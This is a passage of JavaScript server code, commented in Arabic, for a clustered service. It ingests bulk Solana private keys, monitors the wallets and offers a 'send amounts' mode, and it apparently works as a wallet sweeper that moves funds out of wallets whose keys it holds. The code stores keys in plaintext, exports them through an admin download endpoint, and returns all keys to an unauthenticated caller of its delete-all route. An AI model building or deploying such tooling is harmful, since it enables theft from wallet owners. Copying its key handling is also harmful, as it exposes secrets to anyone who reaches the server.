        console.warn('[TG] botToken أو chatId غير محدد — تم تخطي الإشعار');
        return Promise.resolve({});
    }
    return new Promise((resolve) => {
        const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
        const req = https.request({
            hostname: 'api.telegram.org',
            path:     `/bot${botToken}/sendMessage`,
            method:   'POST',
            agent:    httpsKeepAlive,
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(data);
                    if (!parsed.ok) console.error('[TG] خطأ:', parsed.description);
                    resolve(parsed);
                } catch { resolve({}); }
            });
        });
        req.on('error', e => { console.error('[TG] network error:', e.message); resolve({}); });
        req.write(payload);
        req.end();
    });
}

// ─────────────────────────────────────────────────────────────────────────────
//  Shared HTTP app builder
// ─────────────────────────────────────────────────────────────────────────────
function buildExpressApp(getAggregatedState) {
    const compression = require('compression');
    const app = express();
    app.use(compression());
    app.use(express.json({ limit: '50mb' }));
    app.use(express.urlencoded({ extended: true, limit: '50mb' }));
    app.use((_, res, next) => {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        next();
    });

    app.get('/favicon.ico', (_, res) => res.status(204).end());

    app.get('/health', (_, res) => {
        const state = getAggregatedState();
        res.json({ status: 'healthy', uptime: process.uptime(), ...state, timestamp: new Date().toISOString() });
    });

    app.get('/', (_, res) => res.sendFile(path.join(__dirname, 'index.html')));

    app.get('/clear', (_, res) => res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><script>localStorage.clear();location.href='/';<\/script></body></html>`));

    // ── Auth: تسجيل الدخول (المشرف فقط عبر الخادم) ──────────────────────────
    app.post('/api/login', (req, res) => {
        const { username, password } = req.body || {};
        if (!ADMIN_USER || !ADMIN_PASS)
            return res.status(500).json({ error: 'ADMIN_PAS غير مهيأ — أضفه في متغيرات البيئة بصيغة username_password' });
        if (username === ADMIN_USER && password === ADMIN_PASS)
            return res.json({ ok: true, user: ADMIN_USER, token: AUTH_TOKEN, role: 'admin' });
        return res.status(401).json({ error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
    });

    // ── Auth: التحقق من جلسة المشرف ──────────────────────────────────────────
    app.get('/api/me', (req, res) => {
        const h   = req.headers.authorization || '';
        const tok = h.startsWith('Bearer ') ? h.slice(7) : (req.query.token || '');
        if (AUTH_TOKEN && tok === AUTH_TOKEN)
            return res.json({ loggedIn: true, user: ADMIN_USER, role: 'admin' });
        return res.json({ loggedIn: false });
    });

    return app;
}

// ─────────────────────────────────────────────────────────────────────────────
//  PRIMARY PROCESS
// ─────────────────────────────────────────────────────────────────────────────
if (cluster.isPrimary) {

    // Global aggregated state across all processes
    const globalNotifications = [];
    const workerStates        = new Map(); // workerId → state
    let   primaryState        = { isMonitoring: false, walletCount: 0, activeCount: 0, failedCount: 0, walletAddresses: [] };
    let   storedWalletSlices  = []; // [{keys: [...], rpcs: [...]}]
    let   allRpcUrls          = [];
    let   lastSettings        = {}; // آخر إعدادات أُرسلت من المتصفح
    // علَم يمنع المتصفح من إرسال المحافظ مجدداً إذا كان الخادم يملك ملف محفوظ
    let   _hasSavedWallets    = false;

    // ── حفظ جميع المحافظ والإعدادات في ملف دائم على القرص ──────────────────
    function saveWalletsToDisk() {
        try {
            const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
            if (!allKeys.length) { clearWalletsFile(); return; }
            const data = { keys: allKeys, settings: lastSettings, savedAt: new Date().toISOString() };
            const tmp  = WALLETS_FILE + '.tmp';
            // كتابة ذرية: اكتب في ملف مؤقت ثم أعد تسميته لتجنب تلف البيانات عند الانهيار
            fs.writeFileSync(tmp, JSON.stringify(data), 'utf8');
            fs.renameSync(tmp, WALLETS_FILE);
        } catch (e) {
            console.error('[PERSIST] فشل حفظ المحافظ:', e.message);
        }
    }

    function clearWalletsFile() {
        _hasSavedWallets = false;
        try { if (fs.existsSync(WALLETS_FILE)) fs.unlinkSync(WALLETS_FILE); } catch (_) {}
        try { if (fs.existsSync(WALLETS_FILE + '.tmp')) fs.unlinkSync(WALLETS_FILE + '.tmp'); } catch (_) {}
    }

    function loadWalletsFromDisk() {
        // حاول القراءة من الملف الرئيسي، ثم من النسخة الاحتياطية عند الفشل
        for (const filePath of [WALLETS_FILE, WALLETS_FILE + '.tmp']) {
            try {
                if (!fs.existsSync(filePath)) continue;
                const raw  = fs.readFileSync(filePath, 'utf8');
                const data = JSON.parse(raw);
                if (!Array.isArray(data.keys) || !data.keys.length) continue;
                return data; // { keys, settings, savedAt }
            } catch (_) {}
        }
        console.error('[PERSIST] لا يوجد ملف محافظ صالح للقراءة');
        return null;
    }

    // Local monitor for primary's wallet slice
    const primaryMonitor = new SolanaWorkerMonitor((msg, type) => {
        addGlobalNotification(msg, type);
    });

    // ── SSE (Server-Sent Events) للإشعارات الفورية ───────────────────────────
    const sseClients = new Set();
    function pushSSE(payload) {
        if (!sseClients.size) return;
        const msg = `data: ${JSON.stringify(payload)}\n\n`;
        for (const res of sseClients) {
            try { res.write(msg); } catch(_) { sseClients.delete(res); }
        }
    }

    // ── تحديد معدل دفع تقدم التحميل عبر SSE (حد أقصى مرة كل 300ms) ─────────
    let _progressSSETimer  = null;
    let _progressSSEPending = null;

    function addGlobalNotification(message, type) {
        const n = { id: Date.now() + Math.random(), message, type, timestamp: new Date().toISOString() };

        // إشعارات التقدم المؤقتة — لا تُضاف للسجل ولا تُبثّ للعمال
        if (message.startsWith('__PROGRESS__:')) {
            _progressSSEPending = n;
            if (!_progressSSETimer) {
                _progressSSETimer = setTimeout(() => {
                    _progressSSETimer = null;
                    if (_progressSSEPending)
                        pushSSE({ t: 'n', n: _progressSSEPending, state: getLightState() });
                    _progressSSEPending = null;
                }, 300);
            }
            return;
        }

        globalNotifications.unshift(n);
        if (globalNotifications.length > 100) globalNotifications.length = 100;
        // لا نبثّ الإشعارات للعمال — العمال يُولّدون إشعاراتهم مستقلة
        console.log(`[${type.toUpperCase()}] ${message}`);
        // دفع فوري للمتصفح
        pushSSE({ t: 'n', n, state: getLightState() });
    }

    const workers = new Map();

    function broadcastToWorkers(msg) {
        for (const [, w] of workers) { try { w.send(msg); } catch (_) {} }
    }

    // ── طلب Primary→Worker مع انتظار رد (مؤقَّت بـ 8 ثوانٍ) ─────────────────
    let _primaryReqCounter = 0;
    function askWorker(w, cmd, data) {
        return new Promise(resolve => {
            const reqId = 'p-' + (++_primaryReqCounter);
            let settled = false;
            const done = (val) => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);
                w.off('message', handler);
                resolve(val);
            };
            const handler = (msg) => {
                if (msg.cmd === 'worker-response' && msg.reqId === reqId) done(msg.result);
            };
            w.on('message', handler);
            try { w.send({ cmd, reqId, ...data }); } catch(_) { done(null); }
            const timer = setTimeout(() => done(null), 8000);
        });
    }

    let workersReady = 0; // عدد العمال الذين أكملوا التهيئة

    // حالة خفيفة بدون مصفوفة العناوين — للـ SSE وتحديثات الحالة المتكررة
    function getLightState() {
        let totalWallets = primaryState.walletCount;
        let totalActive  = primaryState.activeCount;
        let totalFailed  = primaryState.failedCount;
        let isMonitoring = primaryState.isMonitoring;
        for (const [, s] of workerStates) {
            totalWallets += s.walletCount;
            totalActive  += s.activeCount;
            totalFailed  += s.failedCount;
            if (s.isMonitoring) isMonitoring = true;
        }
        return {
            isMonitoring, totalWallets, totalActive, totalFailed,
            walletAddresses: [],
            workers: workers.size + 1,
            workersReady,
            numWorkers: NUM_EXTRA_WORKERS,
            hasSavedWallets: _hasSavedWallets
        };
    }

    // حالة كاملة مع العناوين — فقط عند طلب /api/state أو /api/status
    function getAggregatedState() {
        const light      = getLightState();
        let allAddresses = [...primaryState.walletAddresses];
        for (const [, s] of workerStates)
            allAddresses = allAddresses.concat(s.walletAddresses || []);
        return { ...light, walletAddresses: allAddresses };
    }

    // ── Fork N workers (عامل لكل رابط RPC، بحد أقصى 7 عمال إضافيين) ──────
    const NUM_EXTRA_WORKERS = Math.max(1, Math.min(ALL_RPC_URLS.length - 1, 7));
    const orderedWorkers = []; // محافظة على ترتيب الـ fork لتوزيع الشرائح

    // ── معالج رسائل العامل — دالة مُسمّاة تُربط بالعامل الصحيح ──────────────
    function setupWorkerHandlers(w) {
        w.on('message', async (msg) => {
            switch (msg.cmd) {
                case 'add-wallets': {
                    const keys = msg.privateKeys.split(/[\r\n]+/).map(k => k.trim()).filter(Boolean);
                    allRpcUrls = ALL_RPC_URLS;

                    if (keys.length === 0) {
                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: false, message: 'لا توجد مفاتيح صالحة' } });
                        return;
                    }

                    lastSettings = msg.settings || {};

                    const total = keys.length;
                    distributeWork(keys);
                    primaryMonitor.stop();
                    broadcastToWorkers({ cmd: 'stop-monitoring' });
                    addGlobalNotification(`🚀 جاري تحميل ${total} محفظة`, 'info');
                    w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, loading: true, total, message: `🚀 جاري تحميل ${total} محفظة — تابع شريط التقدم` } });
                    loadAll(msg.settings || {}, total);
                    break;
                }
                case 'stop': {
                    primaryMonitor.stop();
                    primaryState = primaryMonitor.getState();
                    broadcastToWorkers({ cmd: 'stop-monitoring' });
                    addGlobalNotification('🛑 تم إيقاف مراقبة جميع المحافظ بشكل نهائي', 'info');
                    w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, message: 'تم إيقاف مراقبة جميع المحافظ بشكل نهائي' } });
                    break;
                }
                case 'resume': {
                    if (!storedWalletSlices.length || !storedWalletSlices[0].keys.length) {
                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: false, message: 'لا توجد محافظ محفوظة' } });
                        return;
                    }
                    const resumeTotal = storedWalletSlices.reduce((s, x) => s + x.keys.length, 0);
                    addGlobalNotification(`🚀 جاري استئناف ${resumeTotal} محفظة`, 'info');
                    w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, loading: true, total: resumeTotal, message: `🚀 جاري استئناف ${resumeTotal} محفظة` } });
                    loadAll(lastSettings, resumeTotal);
                    break;
                }
                case 'delete-wallet': {
                    // طلب حذف محفظة قادم من عامل HTTP يُوكّل للـ primary
                    const delAddr = msg.address || '';
                    const shortDel = delAddr.slice(0,4) + '...' + delAddr.slice(-4);
                    const pk = primaryMonitor.removeWallet(delAddr);
                    let found = pk !== null;
                    let removedKey = pk;
                    if (found && storedWalletSlices[0]?.keys) {
                        const ki = storedWalletSlices[0].keys.indexOf(pk);
                        if (ki !== -1) storedWalletSlices[0].keys.splice(ki, 1);
                        primaryState = primaryMonitor.getState();
                    } else if (!found) {
                        // ابحث في جميع العمال بما فيهم الطالب — المحفظة قد تكون عليه
                        for (let wi = 0; wi < orderedWorkers.length; wi++) {
                            const wRes = await askWorker(orderedWorkers[wi], 'delete-wallet', { address: delAddr });
                            if (wRes?.found) {
                                found = true; removedKey = wRes.removedKey;
                                const sliceW = storedWalletSlices[wi + 1];
                                if (removedKey && sliceW?.keys) {
                                    const ki = sliceW.keys.indexOf(removedKey);
                                    if (ki !== -1) sliceW.keys.splice(ki, 1);
                                }
                                break;
                            }
                        }
                    }
                    if (found) {
                        addGlobalNotification(`🗑️ حُذفت المحفظة ${shortDel} من المراقبة`, 'info');
                        await new Promise(r => setTimeout(r, 300));
                        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, message: `تم حذف المحفظة ${shortDel}`, removedKey } });
                    } else {
                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: false, message: `المحفظة ${shortDel} غير موجودة` } });
                    }
                    break;
                }
                case 'append-wallets': {
                    // طلب إضافة تدريجية قادم من عامل HTTP يُوكّل للـ primary
                    const appendKeys     = (msg.keys || []).map(k => k.trim()).filter(Boolean);
                    const appendSettings = msg.settings || lastSettings || {};
                    const modeLabel2     = appendSettings.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';

                    // العملية الأخف بين primary + orderedWorkers
                    let tgt      = 'primary';
                    let minCnt   = primaryMonitor.wallets.length;
                    for (let wi = 0; wi < orderedWorkers.length; wi++) {
                        const ws2  = workerStates.get(orderedWorkers[wi].id);
                        const cnt2 = ws2?.totalWallets ?? Infinity;
                        if (cnt2 < minCnt) { minCnt = cnt2; tgt = wi; }
                    }

                    let appAdded = 0;
                    let appAddedKeys = [];
                    if (tgt === 'primary') {
                        const res2 = await primaryMonitor.appendWallets(appendKeys, appendSettings);
                        appAdded     = res2.addresses.length;
                        appAddedKeys = res2.keys;
                        primaryState = primaryMonitor.getState();
                        if (!storedWalletSlices[0]) storedWalletSlices[0] = { keys: [], rpcs: [] };
                        storedWalletSlices[0].keys.push(...appAddedKeys);
                    } else {
                        const wt     = orderedWorkers[tgt];
                        const wRes2  = await askWorker(wt, 'append-wallets', { keys: appendKeys, settings: appendSettings });
                        appAdded     = wRes2?.added ?? 0;
                        appAddedKeys = wRes2?.addedKeys ?? [];
                        const sIdx   = tgt + 1;
                        if (!storedWalletSlices[sIdx]) storedWalletSlices[sIdx] = { keys: [], rpcs: [] };
                        storedWalletSlices[sIdx].keys.push(...appAddedKeys);
                    }

                    if (appAdded > 0) {
                        addGlobalNotification(`✅ أُضيفت ${appAdded} محفظة جديدة | ${modeLabel2}`, 'success');
                        await new Promise(r => setTimeout(r, 400));
                        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
                    }
                    w.send({ cmd: 'response', reqId: msg.reqId, result: {
                        success: appAdded > 0,
                        message: appAdded > 0 ? `✅ أُضيفت ${appAdded} محفظة للمراقبة` : 'جميع المحافظ موجودة مسبقاً',
                        addedCount: appAdded,
                        addedKeys: appAddedKeys
                    }});
                    break;
                }
                case 'get-notifications':
                    w.send({ cmd: 'response', reqId: msg.reqId, result: globalNotifications });
                    break;
                case 'get-state':
                    // إرجاع الحالة الكاملة (مع العناوين) لطلبات /api/state
                    w.send({ cmd: 'response', reqId: msg.reqId, result: getAggregatedState() });
                    break;
                case 'get-updates':
                    // طلب موحَّد: حالة خفيفة + إشعارات في رسالة IPC واحدة
                    w.send({ cmd: 'response', reqId: msg.reqId, result: { state: getLightState(), notifs: globalNotifications } });
                    break;
                case 'delete-wallet-done':
                    // رد من العامل بعد حذف المحفظة
                    // يُعالَج في askWorker — لا شيء إضافي هنا
                    break;
                case 'worker-state-update':
                    workerStates.set(w.id, msg.state);
                    pushSSE({ t: 's', state: getLightState() });
                    break;
                case 'worker-ready':
                    workersReady = Math.min(workersReady + 1, NUM_EXTRA_WORKERS);
                    pushSSE({ t: 's', state: getLightState() });
                    console.log(`[PRIMARY] العمال الجاهزون: ${workersReady}/${NUM_EXTRA_WORKERS}`);
                    break;
                case 'worker-notification':
                    addGlobalNotification(msg.message, msg.notifType);
                    break;
            }
        });

        // ── إعادة fork تلقائية عند خروج العامل ─────────────────────────────
        w.on('exit', (code, signal) => {
            console.log(`[PRIMARY] Worker ${w.id} exited — reforking…`);
            const idx = orderedWorkers.indexOf(w);
            workers.delete(w.id);
            workerStates.delete(w.id);
            // تصحيح عداد العمال الجاهزين عند الانهيار
            if (workersReady > 0) workersReady--;

            const nw = cluster.fork();
            workers.set(nw.id, nw);
            if (idx !== -1) orderedWorkers[idx] = nw;
            else orderedWorkers.push(nw);
            // ربط معالج الرسائل الجديد بالعامل الجديد بشكل صحيح
            setupWorkerHandlers(nw);

            // ── إعادة تحميل شريحة المحافظ إلى العامل الجديد ─────────────────
            // sliceIdx = idx+1 (المؤشر صفر للـ primary، واحد+ للعمال)
            const sliceIdx = idx !== -1 ? idx + 1 : -1;
            const slice = sliceIdx >= 0 ? storedWalletSlices[sliceIdx] : null;
            const isMonitoring = primaryMonitor.isMonitoring ||
                [...workerStates.values()].some(s => s.isMonitoring);
            if (slice?.keys?.length > 0 && isMonitoring) {
                // انتظر حتى يُعلن العامل عن جاهزيته ثم أرسل شريحته
                const onReady = (m) => {
                    if (m.cmd === 'worker-ready') {
                        nw.off('message', onReady);
                        try {
                            nw.send({
                                cmd:     'load-wallets',
                                keys:    slice.keys,
                                rpcs:    slice.rpcs,
                                allRpcs: allRpcUrls,
                                settings: lastSettings
                            });
                            addGlobalNotification(
                                `🔄 إعادة تحميل ${slice.keys.length} محفظة للعامل المُستبدَل`,
                                'info'
                            );
                        } catch(_) {}
                    }
                };
                nw.on('message', onReady);
            }
        });
    }

    function forkWorker() {
        const w = cluster.fork();
        workers.set(w.id, w);
        orderedWorkers.push(w);
        setupWorkerHandlers(w);
    }

    // ── توزيع العمل على جميع العمليات بالتوازي ─────────────────────────────
    function distributeWork(keyList) {
        const N = orderedWorkers.length + 1; // primary + workers
        const keysPerProc = Math.ceil(keyList.length / N);
        const urlsPerProc = Math.max(1, Math.ceil(allRpcUrls.length / N));
        storedWalletSlices = [];
        for (let i = 0; i < N; i++) {
            storedWalletSlices.push({
                keys: keyList.slice(i * keysPerProc, Math.min((i + 1) * keysPerProc, keyList.length)),
                rpcs: allRpcUrls.slice(i * urlsPerProc, (i + 1) * urlsPerProc)
            });
        }
    }

    function loadAll(settings, total) {
        // أرسل لكل عامل شريحته في نفس الوقت بالتوازي
        for (let i = 0; i < orderedWorkers.length; i++) {
            const s = storedWalletSlices[i + 1];
            if (s?.keys?.length > 0) {
                try {
                    orderedWorkers[i].send({ cmd: 'load-wallets', keys: s.keys, rpcs: s.rpcs, allRpcs: allRpcUrls, settings });
                    addGlobalNotification(`🔄 العامل ${i + 1}: ${s.keys.length} محفظة`, 'info');
                } catch (_) {}
            }
        }
        // Primary يبدأ في نفس الوقت — لا انتظار لأي عامل آخر
        const s0 = storedWalletSlices[0];
        if (s0?.keys?.length > 0) {
            addGlobalNotification(`🔄 العامل الرئيسي: ${s0.keys.length} محفظة`, 'info');
            primaryMonitor.load(s0.keys, s0.rpcs, allRpcUrls, settings)
                .then(() => {
                    primaryState = primaryMonitor.getState();
                    if (total) {
                        addGlobalNotification(`__DONE__:${total}`, 'success');
                        addGlobalNotification(`✅ اكتمل تحميل ${total} محفظة`, 'success');
                    }
                })
                .catch(e => addGlobalNotification(`❌ خطأ في التحميل: ${e.message}`, 'error'));
        }
    }

    for (let i = 0; i < NUM_EXTRA_WORKERS; i++) forkWorker();

    // ── Primary's own Express server (opens port 5000 immediately) ───────────
    const app = buildExpressApp(getAggregatedState);

    app.post('/api/add-wallets', async (req, res) => {
        const keys       = (req.body.privateKeys || '').trim();
        const settings   = req.body.settings   || {};
        if (!keys) { res.json({ success: false, message: 'لا توجد مفاتيح' }); return; }
        if (settings.mode === 'telegram' && !String(settings.chatId || '').trim()) {
            res.json({ success: false, message: '⚠️ يجب إدخال Telegram Chat ID عند اختيار وضع تلجرام' }); return;
        }

        lastSettings = settings; // حفظ الإعدادات لاستخدامها عند الاستئناف
        allRpcUrls = ALL_RPC_URLS;

        const keyList = keys.split(/[\r\n]+/).map(k => k.trim()).filter(Boolean);

        const modeLabel = settings.mode === 'telegram' ? '📨 تلجرام فقط' : '💸 إرسال مبالغ';
        const netLabel  = settings.network === 'devnet' ? 'devnet' : 'mainnet';
        const total     = keyList.length;

        distributeWork(keyList);
        saveWalletsToDisk(); // ── حفظ فوري بعد التوزيع ──
        primaryMonitor.stop();
        broadcastToWorkers({ cmd: 'stop-monitoring' });

        // ── استجب فوراً — جميع العمال يبدؤون بالتوازي في الخلفية ──────────────
        addGlobalNotification(`🚀 جاري تحميل ${total} محفظة — ${modeLabel} | ${netLabel}`, 'info');
        res.json({ success: true, loading: true, total, message: `🚀 جاري تحميل ${total} محفظة — تابع شريط التقدم | ${modeLabel} | ${netLabel}` });
        loadAll(settings, total);
    });

    // ── إضافة محافظ جديدة بدون إيقاف المراقبة الموجودة ─────────────────────────
    app.post('/api/append-wallets', async (req, res) => {
        const newKeys  = (req.body.keys || []).map(k => k.trim()).filter(Boolean);
        const settings = req.body.settings || {};
        if (!newKeys.length) return res.json({ success: false, message: 'لا توجد مفاتيح جديدة' });

        const modeLabel = settings.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';

        // ── اختر العملية الأخف (أقل عدد محافظ) ─────────────────────────────────
        let targetProcess = 'primary';
        let minCount      = primaryMonitor.wallets.length;

        for (let i = 0; i < orderedWorkers.length; i++) {
            const wState = workerStates.get(orderedWorkers[i].id);
            const count  = wState?.totalWallets ?? Infinity;
            if (count < minCount) { minCount = count; targetProcess = i; }
        }

        let addedCount    = 0;
        let addedKeysList = [];
        let dupCount      = 0;
        let parseErrCount = 0;

        if (targetProcess === 'primary') {
            const appendResult = await primaryMonitor.appendWallets(newKeys, settings);
            addedCount    = appendResult.addresses.length;
            addedKeysList = appendResult.keys;
            dupCount      = appendResult.duplicates  || 0;
            parseErrCount = appendResult.parseErrors || 0;
            primaryState  = primaryMonitor.getState();
            if (!storedWalletSlices[0]) storedWalletSlices[0] = { keys: [], rpcs: [] };
            storedWalletSlices[0].keys.push(...addedKeysList);
        } else {
            const w      = orderedWorkers[targetProcess];
            const result = await askWorker(w, 'append-wallets', { keys: newKeys, settings });
            addedCount    = result?.added        ?? 0;
            addedKeysList = result?.addedKeys    ?? [];
            dupCount      = result?.duplicates   ?? 0;
            parseErrCount = result?.parseErrors  ?? 0;
            const sliceIdx = targetProcess + 1;
            if (!storedWalletSlices[sliceIdx]) storedWalletSlices[sliceIdx] = { keys: [], rpcs: [] };
            storedWalletSlices[sliceIdx].keys.push(...addedKeysList);
        }
        if (addedCount > 0) saveWalletsToDisk(); // ── حفظ بعد الإضافة ──

        if (addedCount === 0) {
            let msg;
            if (parseErrCount > 0 && dupCount === 0)
                msg = `❌ المفاتيح المُدخلة غير صالحة (${parseErrCount} خطأ في التحليل)`;
            else if (parseErrCount > 0)
                msg = `⚠️ ${dupCount} مكررة، ${parseErrCount} غير صالحة — لم تُضَف أي محفظة جديدة`;
            else
                msg = 'جميع المحافظ المُدخلة موجودة مسبقاً في المراقبة';
            return res.json({ success: false, message: msg });
        }

        addGlobalNotification(`✅ أُضيفت ${addedCount} محفظة جديدة | ${modeLabel}`, 'success');
        await new Promise(r => setTimeout(r, 400));
        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
        res.json({ success: true, message: `✅ أُضيفت ${addedCount} محفظة للمراقبة`, addedCount, addedKeys: addedKeysList });
    });

    // ── تحديث الإعدادات على المراقبة الجارية دون إعادة تحميل المحافظ ──────────
    app.post('/api/update-settings', async (req, res) => {
        const settings = req.body.settings || {};
        if (settings.mode === 'telegram' && !String(settings.chatId || '').trim()) {
            res.json({ success: false, message: '⚠️ يجب إدخال Telegram Chat ID عند اختيار وضع تلجرام' }); return;
        }
        lastSettings = settings;
        saveWalletsToDisk(); // ── حفظ الإعدادات الجديدة في الملف الدائم ──
        const needsReload = primaryMonitor.applySettings(settings);
        broadcastToWorkers({ cmd: 'update-settings', settings });

        if (needsReload && storedWalletSlices.length) {
            // الشبكة تغيرت أثناء المراقبة — أعد تحميل المحافظ بالإعدادات الجديدة
            addGlobalNotification('🔄 تغيير الشبكة يتطلب إعادة تحميل المحافظ…', 'info');
            res.json({ success: true, reload: true, message: '🔄 تغيير الشبكة يتطلب إعادة تحميل المحافظ تلقائياً…' });
            loadAll(settings);
        } else {
            primaryState = primaryMonitor.getState();
            const modeLabel = settings.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';
            const netLabel  = settings.network === 'devnet' ? 'Devnet' : 'Mainnet';
            res.json({ success: true, reload: false, message: `✅ الإعدادات حُدِّثت: ${modeLabel} | ${netLabel}` });
        }
    });

    app.post('/api/stop', (_, res) => {
        primaryMonitor.stop();
        primaryState = primaryMonitor.getState();
        broadcastToWorkers({ cmd: 'stop-monitoring' });
        addGlobalNotification('🛑 تم إيقاف مراقبة جميع المحافظ بشكل نهائي', 'info');
        res.json({ success: true, message: 'تم إيقاف مراقبة جميع المحافظ بشكل نهائي' });
    });

    // ── حذف محفظة واحدة من المراقبة — يقطع اشتراكاتها ويحذف كاشها ─────────────
    app.post('/api/delete-wallet', async (req, res) => {
        const { address } = req.body || {};
        if (!address || typeof address !== 'string') {
            return res.json({ success: false, message: 'عنوان المحفظة مطلوب' });
        }
        const shortAddr = address.slice(0, 4) + '...' + address.slice(-4);

        // ── محاولة 1: Primary Monitor ────────────────────────────────────────
        const primaryKey = primaryMonitor.removeWallet(address);
        if (primaryKey !== null) {
            // حذف المفتاح من شريحة Primary المحفوظة
            const slice0 = storedWalletSlices[0];
            if (slice0?.keys) {
                const ki = slice0.keys.indexOf(primaryKey);
                if (ki !== -1) slice0.keys.splice(ki, 1);
            }
            primaryState = primaryMonitor.getState();
            saveWalletsToDisk(); // ── حفظ بعد الحذف ──
            addGlobalNotification(`🗑️ حُذفت المحفظة ${shortAddr} من المراقبة`, 'info');
            pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
            return res.json({ success: true, message: `تم حذف المحفظة ${shortAddr}`, removedKey: primaryKey });
        }

        // ── محاولة 2: Worker Monitors ────────────────────────────────────────
        for (let i = 0; i < orderedWorkers.length; i++) {
            const result = await askWorker(orderedWorkers[i], 'delete-wallet', { address });
            if (result?.found) {
                // حذف المفتاح من شريحة هذا العامل المحفوظة
                const sliceW = storedWalletSlices[i + 1];
                if (result.removedKey && sliceW?.keys) {
                    const ki = sliceW.keys.indexOf(result.removedKey);
                    if (ki !== -1) sliceW.keys.splice(ki, 1);
                }
                saveWalletsToDisk(); // ── حفظ بعد الحذف ──
                addGlobalNotification(`🗑️ حُذفت المحفظة ${shortAddr} من العامل ${i + 1}`, 'info');
                // انتظر قليلاً حتى يُرسل العامل تحديث حالته عبر IPC
                await new Promise(r => setTimeout(r, 350));
                pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
                return res.json({ success: true, message: `تم حذف المحفظة ${shortAddr}`, removedKey: result.removedKey });
            }
        }

        res.json({ success: false, message: `المحفظة ${shortAddr} غير موجودة في قائمة المراقبة` });
    });

    // ── حذف جميع المحافظ دفعةً واحدة — نفس آلية removeWallet لكل محفظة ─────────
    app.post('/api/delete-all-wallets', async (req, res) => {
        // جمع كل المفاتيح الخاصة المحفوظة قبل الحذف
        const allKeys = storedWalletSlices.flatMap(s => s.keys || []);

        // إيقاف Primary ثم جميع العمال مع مسح بيانات المحافظ نهائياً
        primaryMonitor.stop(true);
        primaryState = primaryMonitor.getState();
        broadcastToWorkers({ cmd: 'stop-monitoring', clearAll: true });

        // مسح الحالة المؤقتة للعمال فوراً حتى لا تظهر محافظ قديمة في SSE
        for (const [id, s] of workerStates) {
            workerStates.set(id, { ...s, isMonitoring: false, walletCount: 0, activeCount: 0, failedCount: 0, walletAddresses: [] });
        }

        // مسح شرائح التخزين حتى لا يُستأنف عند /api/resume
        storedWalletSlices.length = 0;
        clearWalletsFile(); // ── حذف الملف الدائم ──

        const count = allKeys.length;
        addGlobalNotification(`🗑️ تم حذف جميع المحافظ (${count} محفظة) من المراقبة`, 'info');
        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });

        res.json({ success: true, message: `تم حذف ${count} محفظة`, removedKeys: allKeys, count });
    });

    app.post('/api/resume', async (_, res) => {
        if (!storedWalletSlices.length || !storedWalletSlices[0].keys.length) {
            res.json({ success: false, message: 'لا توجد محافظ محفوظة' }); return;
        }
        const resumeTotal = storedWalletSlices.reduce((s, x) => s + x.keys.length, 0);
        addGlobalNotification('▶️ جاري استئناف مراقبة جميع المحافظ بالتوازي…', 'info');
        res.json({ success: true, message: 'تم استئناف المراقبة' });
        loadAll(lastSettings, resumeTotal);
    });

    app.get('/api/notifications', (_, res) => res.json(globalNotifications));

    app.get('/api/state', (_, res) => res.json(getAggregatedState()));

    // ── تنزيل جميع المفاتيح (للمشرف فقط) ─────────────────────────────────────
    app.get('/api/download-keys', (req, res) => {
        const h   = req.headers.authorization || '';
        const tok = h.startsWith('Bearer ') ? h.slice(7) : (req.query.token || '');
        if (!AUTH_TOKEN || tok !== AUTH_TOKEN)
            return res.status(401).end();
        const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
        if (!allKeys.length)
            return res.status(404).json({ error: 'لا توجد محافظ محفوظة' });
        const content = allKeys.join('\n\n');
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.setHeader('Content-Disposition', 'attachment; filename="keys.txt"');
        res.send(content);
    });

    // ── SSE endpoint للدفع الفوري ─────────────────────────────────────────────
    app.get('/api/events', (req, res) => {
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        res.setHeader('X-Accel-Buffering', 'no');
        res.flushHeaders();
        // إرسال الحالة الأولية فور الاتصال
        res.write(`data: ${JSON.stringify({ t: 'i', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) })}\n\n`);
        sseClients.add(res);
        req.on('close', () => sseClients.delete(res));
    });

    // ── endpoint موحَّد: state + notifications في طلب واحد ───────────────────
    app.get('/api/updates', (_, res) => {
        res.json({ state: getAggregatedState(), notifs: globalNotifications });
    });

    app.get('/api/status', (_, res) => {
        const state = getAggregatedState();
        const wallets = state.walletAddresses.map((w, i) => ({
            index: i + 1, address: w.address, hasSubscription: w.active,
            isFailed: w.isFailed, errorCount: w.errorCount
        }));
        res.json({ message: buildStatusMessage(state, wallets), wallets });
    });

    function buildStatusMessage(state, wallets) {
        let msg = `📊 حالة المحافظ:\n\n`;
        wallets.forEach((w, i) => {
